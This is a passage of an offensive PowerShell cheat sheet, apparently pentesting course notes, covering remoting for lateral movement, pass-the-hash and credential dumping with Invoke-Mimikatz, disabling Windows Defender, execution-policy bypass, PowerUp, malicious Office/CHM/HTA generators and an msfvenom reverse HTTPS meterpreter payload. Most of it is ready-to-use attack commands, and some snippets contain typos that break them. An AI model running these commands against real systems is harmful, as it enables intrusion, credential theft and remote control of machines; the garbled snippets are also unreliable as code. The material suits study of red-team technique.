<li><code class="codehilite"><span class="err">​$</span><span class="n">cred</span> <span class="o">=</span> <span class="k">Get</span><span class="o">-</span><span class="n">Credential</span></code> -&gt; <code class="codehilite"><span class="n">Enter</span><span class="o">-</span><span class="n">PSSession</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">24</span><span class="p">.</span><span class="mi">244</span> <span class="o">-</span><span class="n">Authentication</span> <span class="n">Negotiate</span> <span class="o">-</span><span class="n">Credential</span> <span class="err">$</span><span class="n">cred</span></code></li>
</ul>
</li>
<li>Define a function in a remote machine and call it:
  <div class="codehilite"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Command</span> <span class="o">-</span><span class="n">ScriptBlock</span> <span class="err">{</span><span class="k">function</span> <span class="n">Example1</span> <span class="err">{</span><span class="n">whoami</span><span class="p">;</span><span class="err">}}</span> <span class="o">-</span><span class="k">Session</span> <span class="err">$</span><span class="n">ses</span>
<span class="n">Invoke</span><span class="o">-</span><span class="n">Command</span> <span class="o">-</span><span class="n">ScriptBlock</span> <span class="err">{</span><span class="n">Example1</span><span class="err">}</span> <span class="o">-</span><span class="k">Session</span> <span class="err">$</span><span class="n">ses</span>
<span class="n">PSSession</span> <span class="o">-</span><span class="n">CommandName</span> <span class="n">Example1</span> <span class="o">-</span><span class="k">Session</span> <span class="err">$</span><span class="n">ses</span>
</pre></div></li>
<li>Export a command from a remote machine:
  <div class="codehilite"><pre><span></span><span class="n">Export</span><span class="o">-</span><span class="n">PSSession</span> <span class="o">-</span><span class="n">Module</span> <span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">CommandName</span> <span class="n">Example1</span> <span class="o">-</span><span class="k">Session</span> <span class="err">$</span><span class="n">ses</span>
</pre></div></li>
<li>Double Hop Problem (Attacker delegate sending token to target-2 from target-1)
  <img alt="image-20190615074509591" src="../_assets/image-20190615074509591.png" />
  <div class="codehilite"><pre><span></span><span class="n">Enable</span><span class="o">-</span><span class="n">WSManCredSSP</span> <span class="o">-</span><span class="k">Role</span> <span class="n">Client</span> <span class="o">-</span><span class="n">DelegateComputer</span>
<span class="n">Enable</span><span class="o">-</span><span class="n">WSManCredSSP</span> <span class="o">-</span><span class="k">Role</span> <span class="n">Server</span>
<span class="k">Get</span><span class="o">-</span><span class="n">WSManCredSSP</span>
<span class="n">Enter</span><span class="o">-</span><span class="n">PSSession</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">Credential</span> <span class="o">&lt;</span><span class="n">cred</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">Authentication</span> <span class="n">CredSSP</span>
</pre></div></li>
<li>Useful cmdlets<ul>
<li>New-PSSession</li>
<li>Enter-PSSession
  <div class="codehilite"><pre><span></span><span class="nb">Set-MpPreference</span> <span class="n">-DisableRealtimeMonitoring</span> <span class="nv">$true</span> <span class="c">#Disable Windows Defender</span>
<span class="nb">New-PSSession</span> <span class="n">-ComputerName</span> <span class="n">instance</span>
<span class="nv">$sess</span> <span class="p">=</span> <span class="nb">New-PSSession</span> <span class="n">-ComputerName</span> <span class="n">instance</span>
<span class="nb">Enter-PSSEssion</span> <span class="p">-</span> <span class="n">Session</span> <span class="nv">$sess</span>
</pre></div></li>
</ul>
</li>
</ul>
</li>
<li>One to Many (Fan-out Remoting)<ul>
<li>Non-interactive</li>
<li>Parallel command execution</li>
<li>Can:<ul>
<li>Execute scripts from files</li>
<li>Run commands on multiple remote computers</li>
<li>Run commands in disconnected sessions (v3)</li>
<li>Run as background task</li>
</ul>
</li>
<li>Useful in:<ul>
<li>Perform command execution without dropping exe onto disk</li>
<li>Useful for passing and replying hashes, tickets and other AD attacks</li>
</ul>
</li>
<li>Run commands: <ul>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">Command</span> <span class="o">-</span><span class="n">ScriptBlock</span> <span class="err">{</span><span class="n">whoami</span><span class="p">;</span><span class="n">hostname</span><span class="err">}</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="n">instance</span></code></li>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">Command</span> <span class="o">-</span><span class="n">ScriptBlock</span> <span class="err">{</span><span class="k">Get</span><span class="o">-</span><span class="n">Process</span><span class="err">}</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="p">(</span><span class="k">Get</span><span class="o">-</span><span class="n">Content</span> <span class="o">&lt;</span><span class="n">list</span><span class="o">-</span><span class="k">of</span><span class="o">-</span><span class="n">servers</span><span class="o">&gt;</span><span class="p">)</span></code></li>
</ul>
</li>
<li>Run scripts: <ul>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">Command</span> <span class="o">-</span><span class="n">FilePath</span> <span class="n">example</span><span class="p">.</span><span class="n">ps1</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="n">instance</span></code></li>
</ul>
</li>
<li>Run functions installed on the remote box: <ul>
<li><code class="codehilite">Invoke-Command -ScriptBlock <span class="cp">${</span><span class="n">function</span><span class="p">:</span><span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span><span class="cp">}</span> -ComputerName instance</code></li>
</ul>
</li>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">Command</span></code> doesn't create a session.</li>
<li>Stateful commands:
  <div class="codehilite"><pre><span></span><span class="nv">$sess</span> <span class="p">=</span> <span class="nb">New-PSSession</span> <span class="n">-ComputerName</span> <span class="n">instance</span>
<span class="nb">Invoke-Command</span> <span class="n">-Session</span> <span class="nv">$sess</span> <span class="n">-ScriptBlock</span> <span class="p">{</span><span class="nv">$proc</span> <span class="p">=</span> <span class="nb">Get-Process</span><span class="p">}</span>
<span class="nb">Invoke-Command</span> <span class="n">-Session</span> <span class="nv">$sess</span> <span class="n">-ScriptBlock</span> <span class="p">{</span><span class="nv">$proc</span><span class="p">.</span><span class="n">Name</span><span class="p">}</span>
</pre></div></li>
</ul>
</li>
</ul>
<h2 id="tools">Tools<a class="headerlink" href="#tools" title="Permanent link">&para;</a></h2>
<ul>
<li>
<p>Mimikatz (ReflectivePEInjection is used to load into memory)</p>
<ul>
<li>Uses <code class="codehilite"><span class="n">ReflectivePEInjection</span></code> <a href="https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/">https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/</a> to load mimikatz into memory</li>
<li>Pass the Hash
  <div class="codehilite"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">Command</span> <span class="s1">&#39;&quot;sekurlsa::pth /user:&lt;name_of_the_user&gt; /domain:. /ntlm:&lt;ntlmhash&gt; /run:powershell.exe&quot;&#39;</span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">Command</span> <span class="s1">&#39;&quot;sekurlsa::pth /user:Administrator  /domain:. /ntlm:&lt;ntlmhash&gt; /run:powershell.exe&quot;&#39;</span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">DumpCreds</span>
<span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">DumpCerts</span>
</pre></div></li>
</ul>
<ul>
<li>Dump Creds from multiple machines
  <div class="codehilite"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">DumpCreds</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="o">@</span><span class="p">(</span><span class="ss">&quot;instance1&quot;</span><span class="p">,</span> <span class="ss">&quot;instance2&quot;</span><span class="p">)</span>
</pre></div></li>
<li>Load PowerUp
  <div class="codehilite"><pre><span></span><span class="n">powershell</span> <span class="o">-</span><span class="n">ExecutionPolicy</span> <span class="n">Bypass</span>
<span class="n">Import</span><span class="o">-</span><span class="n">Module</span> <span class="p">.</span><span class="o">/</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
<span class="n">Invoke</span><span class="o">-</span><span class="n">AllChecks</span>
</pre></div></li>
</ul>
</li>
</ul>
<h2 id="active-directory">Active Directory<a class="headerlink" href="#active-directory" title="Permanent link">&para;</a></h2>
<ul>
<li>[ADSI]<ul>
<li>Get member of the domain admin group: <code class="codehilite"><span class="p">(</span><span class="o">[</span><span class="n">ADSI</span><span class="o">]</span><span class="ss">&quot;LDAP://cn=Domain Admin,cn=Users,dc=Example,dc=com&quot;</span><span class="p">).</span><span class="n">Members</span><span class="w"></span></code></li>
<li>Get memberships of a user: <code class="codehilite"><span class="p">(</span><span class="o">[</span><span class="n">ADSI</span><span class="o">]</span><span class="ss">&quot;LDAP://cn=Administrator,cn=Users,dc=Example,dc=com&quot;</span><span class="p">).</span><span class="n">MemberOf</span><span class="w"></span></code></li>
</ul>
</li>
<li>.NET Class: <code class="codehilite"><span class="k">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">ActiveDirectory</span></code></li>
<li>Native Executable</li>
<li>PowerShell (,Net classes or WMI or AD module)</li>
</ul>
<h2 id="net">.Net<a class="headerlink" href="#net" title="Permanent link">&para;</a></h2>
<ul>
<li>Exploring Assemblies<ul>
<li>Finding assemblies
  <div class="codehilite"><pre><span></span><span class="err">$</span><span class="n">Classes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="n">AppDomain</span><span class="o">]::</span><span class="n">CurrentDomain</span><span class="p">.</span><span class="n">GetAssemblies</span><span class="p">()</span><span class="w"></span>
<span class="err">$</span><span class="n">Classes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="n">AppDomain</span><span class="o">]::</span><span class="n">CurrentDomain</span><span class="p">.</span><span class="n">GetAssemblies</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach</span><span class="o">-</span><span class="k">Object</span><span class="w"> </span><span class="err">{$</span><span class="n">_</span><span class="p">.</span><span class="n">GetTypes</span><span class="p">()</span><span class="err">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Where</span><span class="o">-</span><span class="k">Object</span><span class="w"> </span><span class="err">{$</span><span class="n">_</span><span class="p">.</span><span class="n">IsPublic</span><span class="w"> </span><span class="o">-</span><span class="n">eq</span><span class="w"> </span><span class="ss">&quot;True&quot;</span><span class="err">}</span><span class="w"></span>
</pre></div></li>
<li>Working with assemblies and invoking functions
  <div class="codehilite"><pre><span></span><span class="x">$ProcClass = $Classes | Where-Object </span><span class="cp">{</span><span class="nv">$_.Name</span> <span class="o">-</span><span class="na">eq</span> <span class="s2">&quot;Proccess&quot;</span><span class="cp">}</span><span class="x"></span>
<span class="x">$ProcClass | Get-Members</span>
<span class="x">$ProcClass | Get-Members -MemberType Method -Static</span>
<span class="x">$ProcClass.GetMethods()</span>
<span class="x">$ProcClass::GetCurrentProcess()</span>
<span class="x">$ProcClass.FullName</span>

<span class="x">[System.Diagnostic.Process]::GetCurrentProcess()</span>

<span class="x">[System.Diagnostic.Process] | Get-Members -MemberType Method -Static | Format-List *</span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="k">Add</span><span class="o">-</span><span class="k">Type</span> <span class="o">-</span><span class="n">AssemblyName</span> <span class="k">System</span><span class="p">.</span><span class="n">Windows</span><span class="p">.</span><span class="n">Forms</span>
<span class="p">[</span><span class="k">System</span><span class="p">.</span><span class="n">Windows</span><span class="p">.</span><span class="n">Forms</span><span class="p">.</span><span class="n">Sendkeys</span><span class="p">]</span>
</pre></div></li>
<li>AssemblyName
  <div class="codehilite"><pre><span></span><span class="k">Add</span><span class="o">-</span><span class="k">Type</span> <span class="o">-</span><span class="n">AssemblyName</span> <span class="k">System</span><span class="p">.</span><span class="n">ServiceProcess</span>
<span class="p">[</span><span class="k">System</span><span class="p">.</span><span class="n">ServiceProcess</span><span class="p">.</span><span class="n">ServiceController</span><span class="p">]</span> <span class="o">|</span> <span class="k">Get</span><span class="o">-</span><span class="n">Members</span> <span class="o">-</span><span class="n">MemberType</span> <span class="k">Method</span> <span class="o">-</span><span class="k">Static</span> <span class="o">|</span> <span class="n">Format</span><span class="o">-</span><span class="n">List</span> <span class="o">*</span>
<span class="p">[</span><span class="k">System</span><span class="p">.</span><span class="n">ServiceProcess</span><span class="p">.</span><span class="n">ServiceController</span><span class="p">]::</span><span class="n">GetDevices</span><span class="p">()</span>
</pre></div></li>
<li>TypeDefinition
  <div class="codehilite"><pre><span></span><span class="err">$</span><span class="n">DotnetCode</span> <span class="o">=</span> <span class="s">@&quot;</span>
<span class="n">public</span> <span class="k">class</span> <span class="n">SysCommands</span>

<span class="n">public</span> <span class="k">static</span> <span class="kt">void</span> <span class="nf">lookup</span> <span class="p">(</span><span class="n">string</span> <span class="n">domainname</span><span class="p">)</span> <span class="p">{</span>
<span class="n">System</span><span class="p">.</span> <span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="s">&quot;ns lookup.exe&quot;</span><span class="p">,</span> <span class="n">domainname</span><span class="p">)</span> <span class="p">;</span>
<span class="p">}</span>

<span class="n">public</span> <span class="kt">void</span> <span class="nf">netcmd</span> <span class="p">(</span><span class="n">string</span> <span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
<span class="n">string</span> <span class="n">cmdstring</span> <span class="o">=</span> <span class="s">&quot;/k net.exe &quot;</span> <span class="o">+</span> <span class="n">cmd</span><span class="p">;</span>
<span class="n">System</span><span class="p">.</span> <span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="s">&quot;cmd. exe&quot;</span> <span class="p">,</span><span class="n">cmdstring</span><span class="p">)</span> <span class="p">;</span>
<span class="p">}</span>

<span class="n">public</span> <span class="k">static</span> <span class="kt">void</span> <span class="nf">Main</span><span class="p">()</span> <span class="p">{</span>
<span class="n">string</span> <span class="n">cmdstring</span> <span class="o">=</span> <span class="s">&quot;/k net.exe &quot;</span> <span class="o">+</span> <span class="s">&quot;user&quot;</span><span class="p">;</span>
<span class="n">System</span><span class="p">.</span> <span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="s">&quot;cmd. exe&quot;</span><span class="p">,</span><span class="n">cmdstring</span><span class="p">);</span>
<span class="p">}</span>
<span class="s">&quot;@</span>

<span class="cp"># Compile .Net code and load objects from it</span>
<span class="n">Add</span><span class="o">-</span><span class="n">Type</span> <span class="o">-</span><span class="n">TypeDefinition</span> <span class="err">$</span><span class="n">DotnetCode</span> <span class="o">-</span><span class="n">OutputType</span> <span class="n">Library</span> <span class="o">-</span><span class="n">OutputAssembly</span> <span class="n">SysCommand</span><span class="p">.</span><span class="n">dll</span>
<span class="n">Add</span><span class="o">-</span><span class="n">Type</span> <span class="o">-</span><span class="n">TypeDefinition</span> <span class="err">$</span><span class="n">DotnetCode</span> <span class="o">-</span><span class="n">OutputType</span> <span class="n">ConsoleApplication</span> <span class="o">-</span><span class="n">OutputAssembly</span> <span class="n">SysCommand</span><span class="p">.</span><span class="n">exe</span>
<span class="p">[</span><span class="n">SysCommand</span><span class="p">]</span><span class="o">::</span><span class="n">lookup</span><span class="p">(</span><span class="s">&quot;google.com&quot;</span><span class="p">)</span>

<span class="cp"># Load objects from a DLL into Memory</span>
<span class="err">$</span><span class="n">obj</span> <span class="o">=</span> <span class="n">Add</span><span class="o">-</span><span class="n">Type</span> <span class="o">-</span><span class="n">Path</span> <span class="n">SysCommand</span><span class="p">.</span><span class="n">dll</span> <span class="o">-</span><span class="n">PassThru</span>
<span class="err">$</span><span class="n">obj</span> <span class="o">|</span> <span class="n">Get</span><span class="o">-</span><span class="n">Members</span>
<span class="p">[</span><span class="n">SysCommand</span><span class="p">]</span><span class="o">::</span><span class="n">lookup</span><span class="p">(</span><span class="s">&quot;google.com&quot;</span><span class="p">)</span>

<span class="cp"># Calling non-static functions</span>
<span class="err">$</span><span class="n">obj</span> <span class="o">=</span> <span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">SysCommands</span>
<span class="err">$</span><span class="n">obj</span> <span class="p">.</span><span class="n">netcmd</span><span class="p">(</span><span class="s">&quot;user&quot;</span><span class="p">)</span><span class="err">#</span><span class="o">&gt;</span>
</pre></div></li>
<li>MemberDefinition - DLL Import
  <div class="codehilite"><pre><span></span><span class="err">$</span><span class="n">Apicode</span> <span class="o">=</span> <span class="s">@&quot;</span>

<span class="p">[</span><span class="n">DllImport</span><span class="p">(</span><span class="s">&quot;kerne132.d11&quot;</span><span class="p">)]</span>
<span class="n">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="n">CreateSymbolicLink</span><span class="p">(</span><span class="n">string</span> <span class="n">IpSymlinkFileName</span><span class="p">,</span> <span class="n">string</span> <span class="n">IpTargetFileName</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dwFlags</span><span class="p">);</span>

<span class="s">&quot;@</span>

<span class="err">$</span><span class="n">SymLink</span> <span class="o">=</span> <span class="n">Add</span><span class="o">-</span><span class="n">Type</span> <span class="o">-</span><span class="n">MemberDefinition</span> <span class="err">$</span><span class="n">ApiCode</span> <span class="o">-</span><span class="n">Name</span> <span class="n">Symlink</span> <span class="o">-</span><span class="n">Namespace</span> <span class="n">CreatSymLink</span> <span class="o">-</span><span class="n">PassThru</span>
<span class="err">$</span><span class="n">SymLink</span><span class="o">::</span><span class="n">CreateSymbolicLink</span><span class="p">(</span><span class="err">&#39;</span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">test</span><span class="err">\</span><span class="n">link</span><span class="err">&#39;</span><span class="p">,</span> <span class="err">&#39;</span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</pre></div></li>
</ul>
</li>
</ul>
<h2 id="wmi">WMI<a class="headerlink" href="#wmi" title="Permanent link">&para;</a></h2>
<ul>
<li>Exploring namespaces: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">WmiObject</span> <span class="o">-</span><span class="n">Namespace</span> <span class="ss">&quot;root&quot;</span> <span class="o">-</span><span class="k">Class</span> <span class="ss">&quot;__Namespace&quot;</span> <span class="o">|</span> <span class="k">select</span> <span class="n">name</span></code></li>
<li>List even the nested namespaces: <a href="http://www.powershellmagazine.com/2013/10/18/pstip-list-all-wmi-namespaces-on-a-system/">http://www.powershellmagazine.com/2013/10/18/pstip-list-all-wmi-namespaces-on-a-system/</a></li>
<li>Exploring Classes: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">WmiObject</span> <span class="err">–</span><span class="n">NameSpace</span> <span class="err">“</span><span class="o">&lt;</span><span class="n">namespace</span><span class="o">&gt;</span><span class="err">”</span> <span class="err">–</span><span class="n">List</span></code></li>
<li>Exploring Methods: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">WmiObject</span> <span class="o">-</span><span class="k">Class</span> <span class="o">&lt;</span><span class="k">class</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">List</span> <span class="o">|</span> <span class="k">Select</span><span class="o">-</span><span class="k">Object</span> <span class="o">-</span><span class="n">ExpandProperty</span> <span class="n">Methods</span></code></li>
<li>Filter based on properties of objects getting returned: 
    <div class="codehilite"><pre><span></span><span class="x">Get-WmiObject -Class Win32_Process -Filter (Name = &quot;powershell.exe&quot;)</span>
<span class="x">Get-WmiObject -Class Win32_Process | Where-Object </span><span class="cp">{</span><span class="nv">$_.Name</span> <span class="o">-</span><span class="na">eq</span> <span class="s2">&quot;powershell.exe&quot;</span><span class="cp">}</span><span class="x"></span>
<span class="x">Get-WmiObject -Query </span><span class="cp">{</span><span class="nf">Select</span> <span class="o">*</span> <span class="na">from</span> <span class="na">Win32_Process</span> <span class="na">where</span> <span class="na">Name</span> <span class="o">=</span> <span class="s2">&quot;powershell.exe&quot;</span><span class="cp">}</span><span class="x"></span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="n">Remove</span><span class="o">-</span><span class="n">WmiObject</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">WmiMethod</span> <span class="o">-</span><span class="k">Class</span> <span class="n">Win32_Process</span> <span class="o">-</span><span class="n">Name</span> <span class="k">Create</span> <span class="o">-</span><span class="n">ArgumentList</span> <span class="ss">&quot;notepad.exe&quot;</span>
<span class="n">Invoke</span><span class="o">-</span><span class="n">WmiMethod</span> <span class="o">-</span><span class="k">Class</span> <span class="n">Win32_Process</span> <span class="o">-</span><span class="n">Name</span> <span class="k">Create</span> <span class="o">-</span><span class="n">ArgumentList</span> <span class="ss">&quot;notepad.exe&quot;</span> <span class="o">-</span> <span class="n">ComputerName</span> <span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">Credential</span> <span class="o">&lt;</span><span class="n">cred</span><span class="o">&gt;</span>  
</pre></div></li>
</ul>
<h2 id="com-objects">COM Objects<a class="headerlink" href="#com-objects" title="Permanent link">&para;</a></h2>
<ul>
<li>Explore available COM objects:
    <div class="codehilite"><pre><span></span><span class="nv">Get</span><span class="o">-</span><span class="nv">ChildItem</span> <span class="nv">REGISTRY</span>::<span class="nv">HKEY_CLASSES_ROOT</span>\<span class="nv">CLSID</span> <span class="o">-</span><span class="k">include</span> <span class="nv">PROGID</span> <span class="o">-</span><span class="nv">recurse</span> <span class="o">|</span> <span class="nv">foreach</span> {$<span class="nv">_</span>.<span class="nv">GetValue</span><span class="ss">(</span><span class="s2">&quot;&quot;</span><span class="ss">)</span>} <span class="o">|</span> <span class="nv">Where</span><span class="o">-</span><span class="nv">Object</span> {$<span class="nv">_</span> <span class="o">-</span><span class="nv">match</span> “<span class="o">&lt;</span><span class="nv">appname</span><span class="o">&gt;</span><span class="s2">&quot;</span><span class="s">}</span>
</pre></div>
    <div class="codehilite"><pre><span></span>$<span class="nv">wscript</span> <span class="o">=</span> <span class="nv">New</span><span class="o">-</span><span class="nv">Object</span> <span class="o">-</span><span class="nv">ComObject</span> <span class="nv">WScript</span>.<span class="nv">Shell</span>.<span class="mi">1</span>
$<span class="nv">wscript</span> <span class="o">|</span> <span class="nv">Get</span><span class="o">-</span><span class="nv">Member</span>
$<span class="nv">wscript</span>.<span class="nv">CurrentDirectory</span>
$<span class="nv">wscript</span>.<span class="nv">SendKeys</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">Hello</span><span class="s2">&quot;</span><span class="ss">)</span>
$<span class="nv">wscript</span>.<span class="k">Exec</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">cmd</span><span class="s2">&quot;</span><span class="ss">)</span>
$<span class="nv">wscript</span>.<span class="nv">CreateShortcut</span><span class="ss">(</span>...<span class="ss">)</span>
</pre></div></li>
<li>Interesting COM Objects<ul>
<li>WScript.Shell.1</li>
<li>Shell.Applcation.1   </li>
</ul>
</li>
</ul>
<h2 id="windows-registry">Windows Registry<a class="headerlink" href="#windows-registry" title="Permanent link">&para;</a></h2>
<p><div class="codehilite"><pre><span></span><span class="k">Get</span><span class="o">-</span><span class="n">Item</span> <span class="s1">&#39;HKLM:\SOFTWARE\Microsoft\Windows NT\Current Version&#39;</span>
<span class="k">Get</span><span class="o">-</span><span class="n">ChildItem</span> <span class="s1">&#39;HKLM:\SOFTWARE\Microsoft\Windows NT\Current Version&#39;</span> <span class="o">-</span><span class="n">Recurse</span>
</pre></div>
- Use registry as filesystem:
    <div class="codehilite"><pre><span></span><span class="k">Get</span><span class="o">-</span><span class="n">Provider</span> <span class="o">-</span><span class="n">PSProvider</span> <span class="n">Registry</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="k">Set</span><span class="o">-</span><span class="k">Location</span> <span class="n">Registry</span><span class="p">::</span>
<span class="o">&gt;</span> <span class="n">ls</span>
<span class="o">&gt;</span> <span class="n">cd</span> <span class="n">HKLM</span>
<span class="o">&gt;</span> <span class="n">ls</span>

<span class="k">New</span><span class="o">-</span><span class="n">PSDrive</span> <span class="o">-</span><span class="n">name</span> <span class="n">RegistryDrive</span> <span class="o">-</span><span class="n">PSProvider</span> <span class="n">Registry</span> <span class="o">-</span><span class="n">Root</span> <span class="n">Registry</span><span class="p">::</span>
<span class="o">&gt;</span> <span class="n">dir</span>

<span class="k">Get</span><span class="o">-</span><span class="n">PSDrive</span>

<span class="k">New</span><span class="o">-</span><span class="n">Item</span> <span class="o">-</span><span class="n">Path</span> <span class="n">HKCU</span><span class="p">:</span><span class="err">\</span><span class="n">Test</span><span class="err">\</span><span class="k">New</span>
<span class="k">New</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="o">-</span><span class="n">Path</span> <span class="n">HKCU</span><span class="p">:</span><span class="err">\</span><span class="n">Test</span><span class="err">\</span><span class="k">New</span> <span class="o">-</span><span class="n">Name</span> <span class="n">Reg2</span> <span class="o">-</span><span class="n">PropertyType</span> <span class="n">String</span> <span class="o">-</span><span class="n">Value</span> <span class="mi">2</span>
<span class="k">Rename</span><span class="o">-</span><span class="n">Item</span> <span class="n">HKCU</span><span class="p">:</span><span class="err">\</span><span class="n">Test</span> <span class="o">-</span><span class="n">NewName</span> <span class="n">HKCU</span><span class="p">:</span><span class="n">TestNew</span>
<span class="k">Rename</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="n">HKCU</span><span class="p">:</span><span class="err">\</span><span class="n">Test</span><span class="err">\</span><span class="k">New</span> <span class="o">-</span><span class="n">Name</span> <span class="n">Reg2</span> <span class="o">-</span><span class="n">NewName</span> <span class="n">Reg3</span>
<span class="k">Set</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="o">-</span><span class="n">Path</span> <span class="n">HKCU</span><span class="p">:</span><span class="err">\</span><span class="n">Test</span><span class="err">\</span><span class="k">New</span> <span class="o">-</span><span class="n">Name</span> <span class="n">Reg2</span> <span class="o">-</span><span class="n">Value</span> <span class="mi">3</span>
</pre></div></p>
<ul>
<li>Client Side Attacks<ul>
<li>Out-Word</li>
<li>Out-Excel</li>
<li>Out-CHM</li>
<li>Out-Shortcut</li>
<li>Out-HTA</li>
<li>Out-Java</li>
</ul>
</li>
<li>Encoding<ul>
<li><code class="codehilite"><span class="n">Invole</span><span class="o">-</span><span class="n">Encode</span> <span class="o">-</span><span class="n">DataToEncode</span> <span class="n">example</span><span class="p">.</span><span class="n">ps1</span> <span class="o">-</span><span class="n">OutCommand</span></code><ul>
<li><code class="codehilite"><span class="k">Out</span><span class="o">-</span><span class="n">CHM</span> <span class="o">-</span><span class="n">Payload</span> <span class="ss">&quot;-e &lt;encodedValue&gt;&quot;</span></code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="metasploit">Metasploit<a class="headerlink" href="#metasploit" title="Permanent link">&para;</a></h2>
<ul>
<li>Using Powershell with Metasploit: <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Powershell-in-an-exploit">https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Powershell-in-an-exploit</a>
    <div class="codehilite"><pre><span></span><span class="n">msfvenom</span> <span class="n">meterpreter</span>
<span class="p">.</span><span class="o">/</span><span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_https</span> <span class="n">LHOST</span><span class="o">=&lt;</span><span class="n">IP</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">f</span> <span class="n">psh</span><span class="o">-</span><span class="n">reflection</span>

<span class="n">cmd</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">reverse_powershell</span>
</pre></div></li>
<li>Useful modules:<ul>
<li>exploit/windows/smb/psexec_psh<ul>
<li>Payload is encoded</li>
</ul>
</li>
<li>exploit/windows/local/powershell_cmd_upgrade<ul>
<li>Upgrade native to Powershell</li>
</ul>
</li>
<li>post/windows/manage/powershell/exec_powershell</li>
<li>exploit/multi/script/web_delivery</li>
</ul>
</li>
</ul>
<h2 id="modules">Modules<a class="headerlink" href="#modules" title="Permanent link">&para;</a></h2>
<ul>
<li>Posh-SecMod<ul>
<li><a href="https://github.com/darkoperator/Posh-SecMod">https://github.com/darkoperator/Posh-SecMod</a> - PowerShell Module with Security cmdlets for security work</li>
<li>Discovery: Perform network discovery.</li>
<li>Parse: Parsers for Nmap, DNSRecon and other type of output files from security tools.</li>
<li>PostExploitation: Functions to help in performing post exploitation tasks.</li>
<li>Registry: Collection of functions for manipulating the registry in remote hosts using WMI.</li>
<li>Utilities: General purpose functions.</li>
<li>Audit: Functions that may be usful when performing audit of systems.</li>
<li>Database: Functions that are useful when interacting with databases.</li>
</ul>
</li>
<li>PowerSploit<ul>
<li><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a> - A PowerShell Post-Exploitation Framework</li>
<li>CodeExecution<ul>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">DllInjection</span></code>Injects a Dll into the process ID of your choosing.</li>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">ReflectivePEInjection</span></code>Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.</li>
